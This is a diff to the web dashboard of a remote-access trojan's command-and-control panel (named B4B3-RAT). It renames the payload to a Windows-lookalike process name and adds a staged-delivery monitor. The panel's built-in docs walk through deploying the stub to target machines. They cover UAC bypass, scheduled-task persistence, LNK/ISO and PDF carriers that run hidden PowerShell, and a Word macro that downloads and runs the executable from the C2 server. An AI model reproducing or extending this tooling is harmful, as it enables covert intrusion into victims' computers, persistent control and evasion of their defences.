@@ -332,6 +332,7 @@ a{color:var(--accent);text-decoration:none}
     <button class="pnav" id="pnav-android" onclick="showPage('android')">Android</button>
     <a class="pnav" href="map.html">🌍 Live Map</a>
     <button class="pnav" id="pnav-builder" onclick="showPage('builder')">&#9881; Builder</button>
+    <button class="pnav" id="pnav-stager" onclick="showPage('stager')">&#9889; Stager</button>
     <button class="pnav" id="pnav-docs" onclick="showPage('docs')">&#128214; Docs</button>
   </nav>
   <div class="spacer"></div>
@@ -408,6 +409,7 @@ function showPage(p) {
   else if (p==='bot' && selId) renderTab(selId, currentTab);
   else if (p==='android') renderAndroidPage();
   else if (p==='builder') renderBuilder();
+  else if (p==='stager')  renderStager();
   else if (p==='docs')    renderDocs();
 }
 
@@ -477,7 +479,7 @@ function renderBuilder() {
 <div class="card" style="max-width:680px;margin:0 auto">
   <div class="card-title">&#9881; Stub Builder &mdash; Generate Configured .exe</div>
   <p style="font-size:12px;color:var(--muted);line-height:1.6">
-    Embeds the C2 server address and auth key into <code style="color:var(--accent)">OneDriveHelper.exe</code>.
+    Embeds the C2 server address and auth key into <code style="color:var(--accent)">RuntimeBrokerHelper.exe</code>.
     The resulting binary connects directly to your C2 when run on a target machine.
   </p>
   <div id="builder-form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:4px">
@@ -517,7 +519,7 @@ function renderBuilder() {
   <div id="b-status" style="display:none;padding:10px 14px;border-radius:8px;font-size:13px;margin-top:4px"></div>
   <div style="display:flex;gap:10px;margin-top:8px">
     <button class="btn btn-send" id="b-btn" onclick="doBuild()" style="padding:11px 28px;font-size:14px">
-      &#8659; Build &amp; Download OneDriveHelper.exe
+      &#8659; Build &amp; Download RuntimeBrokerHelper.exe
     </button>
     <button class="btn btn-sec" onclick="fillBuilderFromServer()">
       Use This Server
@@ -525,7 +527,7 @@ function renderBuilder() {
   </div>
   <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:12px 14px;font-size:11px;color:var(--muted);line-height:1.8;margin-top:4px">
     <strong style="color:var(--light)">Deployment:</strong><br>
-    1. Copy <code style="color:var(--accent)">OneDriveHelper.exe</code> to the target machine<br>
+    1. Copy <code style="color:var(--accent)">RuntimeBrokerHelper.exe</code> to the target machine<br>
     2. Run it &mdash; no arguments needed. First run sets up persistence; second run connects to C2.<br>
     3. Bot appears in the sidebar within one beacon interval.
   </div>
@@ -584,7 +586,7 @@ function renderBuilder() {
   <div class="card-title">&#127918; File Carriers</div>
   <p style="font-size:12px;color:var(--muted);line-height:1.6">
     Download a carrier file that, when opened on a target machine, silently fetches and runs
-    <code style="color:var(--accent)">OneDriveHelper.exe</code> from this server's <code style="color:var(--accent)">/dl/exe</code> endpoint.
+    <code style="color:var(--accent)">RuntimeBrokerHelper.exe</code> from this server's <code style="color:var(--accent)">/dl/exe</code> endpoint.
     The stub must already be built (see builder above). Carrier delivery method is detected by the
     parent-process telemetry in the stub.
   </p>
@@ -720,7 +722,7 @@ function renderBuilder() {
   <div style="margin-top:10px;font-size:11px;color:var(--muted);line-height:1.7;background:var(--bg);border-radius:8px;padding:10px">
     <b style="color:var(--light)">How it works:</b> Shell opens <code>.lnk</code> directly &rarr; hidden PowerShell reads
     the <code>.lnk</code> file from disk, extracts decoy PDF bytes &rarr; opens it in default viewer,
-    extracts stub EXE &rarr; drops to <code>%APPDATA%\OneDriveHelper.exe</code> &rarr; runs (no MOTW &rarr; CMSTPLUA elevation).<br>
+    extracts stub EXE &rarr; drops to <code>%APPDATA%\RuntimeBrokerHelper.exe</code> &rarr; runs (no MOTW &rarr; CMSTPLUA elevation).<br>
     <b style="color:var(--light)">Icon:</b> imageres.dll PDF icon. Extension hidden by default in all Windows versions.<br>
     <b style="color:var(--light)">MITRE:</b> T1566.001 + T1204.002 + T1547.009 (LNK persistence vector)
   </div>
@@ -738,7 +740,7 @@ function renderBuilder() {
       <div style="font-size:11px;font-weight:700;color:#e74c3c;margin-bottom:4px">&#9733; GENUINE PDF (.pdf) — Self-contained · exe embedded after %%EOF</div>
       <div style="font-size:11px;color:var(--light);line-height:1.9">
         <b>How:</b> A real <code style="color:var(--accent)">.pdf</code> file. The invoice renders in any viewer.
-        OneDriveHelper.exe is appended verbatim after <code>%%EOF</code> (PDF readers ignore trailing bytes).
+        RuntimeBrokerHelper.exe is appended verbatim after <code>%%EOF</code> (PDF readers ignore trailing bytes).
         <code style="color:var(--accent)">/OpenAction /Launch</code> fires <code style="color:var(--accent)">powershell -w hidden</code>
         which finds the PDF by filename, reads the exe bytes at a patched offset, writes to <code>%TEMP%</code>, and executes.
         No network download during delivery — fully self-contained.<br>
@@ -781,8 +783,8 @@ function renderBuilder() {
   Set sh = CreateObject("WScript.Shell")
   sh.Run "powershell -w hidden -nop -c """ & _
          "$wc=New-Object Net.WebClient;" & _
-         "$wc.DownloadFile('http://YOUR_C2/dl/exe',$env:TEMP+'\\OneDriveHelper.exe');" & _
-         "Start-Process ($env:TEMP+'\\OneDriveHelper.exe') -WindowStyle Hidden""", 0, False
+         "$wc.DownloadFile('http://YOUR_C2/dl/exe',$env:TEMP+'\\RuntimeBrokerHelper.exe');" & _
+         "Start-Process ($env:TEMP+'\\RuntimeBrokerHelper.exe') -WindowStyle Hidden""", 0, False
 End Sub</pre>
       <div style="font-size:11px;color:var(--muted);margin-top:6px">Replace <code>YOUR_C2</code> with your server address. Enable macros when Word prompts. pname=winword.exe &rarr; DR_015 fires.</div>
     </div>
@@ -871,15 +873,15 @@ async function doBuild() {
     const blob = await resp.blob();
     const url  = URL.createObjectURL(blob);
     const a    = document.createElement('a');
-    a.href = url; a.download = 'OneDriveHelper.exe';
+    a.href = url; a.download = 'RuntimeBrokerHelper.exe';
     document.body.appendChild(a); a.click(); a.remove();
     URL.revokeObjectURL(url);
-    showBuildStatus('Download started \u2014 OneDriveHelper.exe is ready (' + Math.round(blob.size/1024) + ' KB)', 'ok');
+    showBuildStatus('Download started \u2014 RuntimeBrokerHelper.exe is ready (' + Math.round(blob.size/1024) + ' KB)', 'ok');
   } catch(e) {
     showBuildStatus('Error: ' + e.message, 'error');
   } finally {
     btn.disabled = false;
-    btn.innerHTML = '&#8659; Build &amp; Download OneDriveHelper.exe';
+    btn.innerHTML = '&#8659; Build &amp; Download RuntimeBrokerHelper.exe';
   }
 }
 
@@ -2324,18 +2326,18 @@ function renderDocs() {
 <!-- ══════════════════════════════════════ DEPLOYMENT & FIRST RUN ══ -->
 <div class="docs-section">
   <div class="docs-h2">Deploying the Stub — Step by Step</div>
-  <p class="docs-p">You only need to get the target to run <code>OneDriveHelper.exe</code> <b>once</b> with admin. Everything else is automatic after that.</p>
+  <p class="docs-p">You only need to get the target to run <code>RuntimeBrokerHelper.exe</code> <b>once</b> with admin. Everything else is automatic after that.</p>
   <div class="docs-card">
     <table class="docs-table">
       <thead><tr><th style="width:40px">#</th><th>What happens</th></tr></thead>
       <tbody>
-        <tr><td>1</td><td><b>Build:</b> run <code>build.ps1</code> → open Builder → fill in C2 host/port/auth/delay/drop path → click Build → download <code>OneDriveHelper.exe</code>.</td></tr>
+        <tr><td>1</td><td><b>Build:</b> run <code>build.ps1</code> → open Builder → fill in C2 host/port/auth/delay/drop path → click Build → download <code>RuntimeBrokerHelper.exe</code>.</td></tr>
         <tr><td>2</td><td><b>Get it onto the target</b> — USB, email, shared folder, web download, whatever method you have.</td></tr>
         <tr><td>3</td><td><b>Run it once</b> — either the target user double-clicks it, or you run it yourself if you already have admin access to the machine (RDP, remote shell, etc.).</td></tr>
         <tr><td>4</td><td><b>UAC dialog appears</b> — "Do you want to allow this app to make changes?" → click <b>Yes</b>. This is the only time admin is needed from the user's side.</td></tr>
         <tr><td>5</td><td><b>First-run setup happens automatically (1–2 seconds):</b>
           <ul style="margin:6px 0 0 16px;line-height:2">
-            <li>Copies itself to the drop path (e.g. <code>C:\Users\Public\OneDriveHelper.exe</code>)</li>
+            <li>Copies itself to the drop path (e.g. <code>C:\Users\Public\RuntimeBrokerHelper.exe</code>)</li>
             <li>Creates a Windows Scheduled Task set to run at every logon with <b>highest privileges (admin, no UAC)</b></li>
             <li>Connects to your C2 — bot appears in the dashboard sidebar</li>
           </ul>
@@ -2345,7 +2347,7 @@ function renderDocs() {
     </table>
   </div>
   <div class="docs-note">If you already have an admin shell on the target (RDP, existing RAT, etc.) you can run it directly:<br>
-  <code>C:\path\to\OneDriveHelper.exe</code><br>
+  <code>C:\path\to\RuntimeBrokerHelper.exe</code><br>
   No double-click needed. The self-elevation code detects it's already elevated and skips UAC entirely.</div>
 </div>
 
@@ -2387,7 +2389,7 @@ function renderDocs() {
       <tbody>
         <tr><td>Overview</td><td>Live summary of all bots — total count, online/offline, recent events. Auto-refreshes every 5 s. Bots persist across server restarts (saved to disk).</td></tr>
         <tr><td>Bot Detail</td><td>Click any bot in the sidebar. Sidebar shows <b>● ONLINE</b> (last seen &lt;60s), <b>○ OFFLINE</b>, or <b>⛔ BLOCKED</b> status. Hover a bot to reveal Block and Delete buttons.</td></tr>
-        <tr><td>⚙ Builder</td><td>Configure and download <code>OneDriveHelper.exe</code>. Fill in C2 Host, Port, Auth Key, delay, drop path — click Build.</td></tr>
+        <tr><td>⚙ Builder</td><td>Configure and download <code>RuntimeBrokerHelper.exe</code>. Fill in C2 Host, Port, Auth Key, delay, drop path — click Build.</td></tr>
         <tr><td>📖 Docs</td><td>This page.</td></tr>
       </tbody>
     </table>
@@ -2711,7 +2713,7 @@ reg delete "HKCU\Software\Microsoft\IdentityStore" /f 2>$null
 
 # 4. Delete the EXE (use the drop path you set in Builder)
 Remove-Item "$env:APPDATA\Microsoft\Windows\Helpers\*" -Force -EA 0
-Remove-Item "$env:APPDATA\OneDriveHelper.exe" -Force -EA 0
+Remove-Item "$env:APPDATA\RuntimeBrokerHelper.exe" -Force -EA 0
 
 # 5. Restore Task Manager if blocked
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f 2>$null
@@ -2740,7 +2742,7 @@ Quick fix: After rebuilding, add the drop path as a Defender exclusion before de
         <tr><td>Auto-reboot (target)</td><td>The scheduled task (<code>/RL HIGHEST</code>) fires at every Windows logon — bot comes back with full admin, no UAC. No user action needed after first run.</td></tr>
         <tr><td>VPS server</td><td>C2 runs at port 443 (via nginx stream proxy → 3000 internally). Requires <code>cert.pem</code>/<code>key.pem</code> in <code>c2-server/</code> for TLS.</td></tr>
         <tr><td>Update server</td><td><code>git pull &amp;&amp; pm2 restart c2-server</code> — bots will re-appear from disk after restart.</td></tr>
-        <tr><td>Rebuild stub</td><td><code>cd B4B3-RAT\Stub</code> → <code>powershell -ExecutionPolicy Bypass -File build.ps1</code> → open Builder → re-configure → new <code>OneDriveHelper.exe</code>.</td></tr>
+        <tr><td>Rebuild stub</td><td><code>cd B4B3-RAT\Stub</code> → <code>powershell -ExecutionPolicy Bypass -File build.ps1</code> → open Builder → re-configure → new <code>RuntimeBrokerHelper.exe</code>.</td></tr>
         <tr><td>Duplicate bots</td><td>Fixed — Bot ID stored in registry on first run. If you still see duplicates, an old binary is running. Kill it: Task Manager → End Process Tree.</td></tr>
         <tr><td>Uploaded files</td><td>Stored in <code>c2-server/uploads/</code> on VPS. Download via Summary → Uploaded Files links. Require login.</td></tr>
       </tbody>
@@ -3330,6 +3332,150 @@ function fmAbs(base, input) {
   if (/^[A-Za-z]:\\/.test(input)) return input;
   if (input === '..') return fmParent(base);
   return fmJoin(base, input);
+}
+
+// ── Stager page ───────────────────────────────────────────────────────────────
+
+let stagerRefreshTimer = null;
+
+function renderStager() {
+  document.getElementById('tab-bar').style.display = 'none';
+  const mc = document.getElementById('main-content');
+  mc.innerHTML = `
+<div class="tab-content" style="overflow-y:auto;flex:1">
+
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px">
+  <div>
+    <div style="font-size:15px;font-weight:700;color:var(--accent)">&#9889; Stage 2 Delivery Monitor</div>
+    <div style="font-size:11px;color:var(--muted);margin-top:2px">Tracks Stage 1 check-ins and Stage 2 payload fetches in real time</div>
+  </div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
+    <span id="stager-live-badge" style="background:#1a3a1a;color:#3fb950;padding:4px 10px;border-radius:12px;font-size:11px;font-weight:600">● LIVE (5s)</span>
+    <a href="/api/stage/stager.ps1" download style="background:var(--bg3);color:var(--light);padding:6px 12px;border-radius:7px;font-size:12px;text-decoration:none;border:1px solid var(--bg3)">&#11123; Download Stager PS1</a>
+    <button onclick="stagerClear()" style="background:#2A0E0E;color:#f47061;border:1px solid #5a1a1a;border-radius:7px;padding:6px 12px;font-size:12px;cursor:pointer">&#128465; Clear Log</button>
+    <button onclick="stagerLoad()" style="background:var(--bg3);color:var(--light);border:none;border-radius:7px;padding:6px 12px;font-size:12px;cursor:pointer">&#8635; Refresh</button>
+  </div>
+</div>
+
+<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:16px">
+  <div class="card" style="padding:14px;gap:4px">
+    <div id="sc-total" style="font-size:1.8rem;font-weight:700;color:var(--accent)">—</div>
+    <div style="font-size:11px;color:var(--muted)">Total Events</div>
+  </div>
+  <div class="card" style="padding:14px;gap:4px">
+    <div id="sc-checkin" style="font-size:1.8rem;font-weight:700;color:#3fb950">—</div>
+    <div style="font-size:11px;color:var(--muted)">Stage 1 Check-ins</div>
+  </div>
+  <div class="card" style="padding:14px;gap:4px">
+    <div id="sc-fetch" style="font-size:1.8rem;font-weight:700;color:#3fb950">—</div>
+    <div style="font-size:11px;color:var(--muted)">Stage 2 Fetches</div>
+  </div>
+  <div class="card" style="padding:14px;gap:4px">
+    <div id="sc-fail" style="font-size:1.8rem;font-weight:700;color:#f85149">—</div>
+    <div style="font-size:11px;color:var(--muted)">Fetch Failures</div>
+  </div>
+</div>
+
+<div style="margin-bottom:10px;display:flex;gap:8px;align-items:center">
+  <select id="stager-filter" onchange="stagerRender()" style="background:var(--bg);border:1px solid var(--bg3);color:var(--text);padding:6px 10px;border-radius:7px;font-size:12px;cursor:pointer">
+    <option value="">All events</option>
+    <option value="checkin">Check-ins only</option>
+    <option value="fetch">Fetches only</option>
+    <option value="fetch_fail">Failures only</option>
+  </select>
+  <span id="stager-updated" style="font-size:11px;color:var(--muted)"></span>
+</div>
+
+<div class="card" style="padding:0;overflow:hidden">
+  <div style="overflow-x:auto">
+    <table style="width:100%;border-collapse:collapse;font-size:12px">
+      <thead>
+        <tr style="background:var(--bg2)">
+          <th style="text-align:left;color:var(--muted);font-weight:500;padding:9px 12px;border-bottom:1px solid var(--bg3)">Time</th>
+          <th style="text-align:left;color:var(--muted);font-weight:500;padding:9px 12px;border-bottom:1px solid var(--bg3)">Type</th>
+          <th style="text-align:left;color:var(--muted);font-weight:500;padding:9px 12px;border-bottom:1px solid var(--bg3)">IP</th>
+          <th style="text-align:left;color:var(--muted);font-weight:500;padding:9px 12px;border-bottom:1px solid var(--bg3)">Host</th>
+          <th style="text-align:left;color:var(--muted);font-weight:500;padding:9px 12px;border-bottom:1px solid var(--bg3)">Detail</th>
+        </tr>
+      </thead>
+      <tbody id="stager-tbody"></tbody>
+    </table>
+    <div id="stager-empty" style="display:none;text-align:center;padding:32px;color:var(--muted);font-size:13px">No staging events yet — deploy the Stage 1 stager to see check-ins here.</div>
+  </div>
+</div>
+
+<div class="card" style="margin-top:8px">
+  <div class="card-title">&#9889; How to use staged delivery</div>
+  <ol style="font-size:12px;color:var(--muted);line-height:2;padding-left:18px">
+    <li>Build &amp; download the configured stub from the <b>Builder</b> tab first (sets C2 host + auth key)</li>
+    <li>Download the <b>Stager PS1</b> above — it auto-contains your C2 URL and XOR key</li>
+    <li>Wrap it in an LNK inside an ISO (no MOTW, no SmartScreen) or embed inline in an HTA</li>
+    <li>When target runs it: <b>Check-in</b> appears here → <b>Fetch</b> appears → full bot shows in sidebar</li>
+  </ol>
+</div>
+
+</div>`;
+
+  stagerLoad();
+  if (stagerRefreshTimer) clearInterval(stagerRefreshTimer);
+  stagerRefreshTimer = setInterval(stagerLoad, 5000);
+}
+
+let _stagerEvents = [];
+
+async function stagerLoad() {
+  try {
+    const r = await fetch(API_BASE + '/api/stage/events', { credentials: 'include' });
+    if (!r.ok) return;
+    _stagerEvents = await r.json();
+    stagerRender();
+  } catch(_) {}
+}
+
+function stagerRender() {
+  const filt = document.getElementById('stager-filter')?.value || '';
+  const rows = filt ? _stagerEvents.filter(e => e.type === filt) : _stagerEvents;
+
+  const setEl = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+  setEl('sc-total',   _stagerEvents.length);
+  setEl('sc-checkin', _stagerEvents.filter(e => e.type === 'checkin').length);
+  setEl('sc-fetch',   _stagerEvents.filter(e => e.type === 'fetch').length);
+  setEl('sc-fail',    _stagerEvents.filter(e => e.type === 'fetch_fail').length);
+  setEl('stager-updated', 'Updated ' + new Date().toLocaleTimeString());
+
+  const tb = document.getElementById('stager-tbody');
+  const empty = document.getElementById('stager-empty');
+  if (!tb) return;
+
+  if (!rows.length) { tb.innerHTML = ''; if (empty) empty.style.display = 'block'; return; }
+  if (empty) empty.style.display = 'none';
+
+  const tagStyle = { checkin:'background:#1f3a5f;color:#58a6ff', fetch:'background:#1a3a1a;color:#3fb950', fetch_fail:'background:#3d1c1c;color:#f85149' };
+  const tagLabel = { checkin:'CHECK-IN', fetch:'FETCH', fetch_fail:'FAIL' };
+
+  tb.innerHTML = rows.map(e => {
+    const ts = new Date(e.ts).toLocaleString();
+    const style = tagStyle[e.type] || tagStyle.checkin;
+    const label = tagLabel[e.type] || e.type.toUpperCase();
+    let detail = '';
+    if (e.type === 'fetch')      detail = (e.bytes||0).toLocaleString() + ' bytes served';
+    else if (e.type === 'fetch_fail') detail = 'No payload ready — build stub first';
+    else detail = (e.ua||'').length > 55 ? (e.ua||'').slice(0,55)+'…' : (e.ua||'—');
+    return `<tr>
+      <td style="padding:8px 12px;border-bottom:1px solid var(--bg2);color:var(--light);font-family:monospace;font-size:11px">${ts}</td>
+      <td style="padding:8px 12px;border-bottom:1px solid var(--bg2)"><span style="display:inline-block;padding:2px 7px;border-radius:10px;font-size:11px;font-weight:600;${style}">${label}</span></td>
+      <td style="padding:8px 12px;border-bottom:1px solid var(--bg2);color:var(--light);font-family:monospace;font-size:11px">${e.ip||'—'}</td>
+      <td style="padding:8px 12px;border-bottom:1px solid var(--bg2);color:var(--light);font-size:11px">${e.host||'—'}</td>
+      <td style="padding:8px 12px;border-bottom:1px solid var(--bg2);color:var(--muted);font-size:11px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${(e.ua||'').replace(/"/g,'&quot;')}">${detail}</td>
+    </tr>`;
+  }).join('');
+}
+
+async function stagerClear() {
+  if (!confirm('Clear all staging events?')) return;
+  await fetch(API_BASE + '/api/stage/events', { method: 'DELETE', credentials: 'include' });
+  _stagerEvents = [];
+  stagerRender();
 }
 
 // ── Init: check auth, then load ───────────────────────────────────────────────
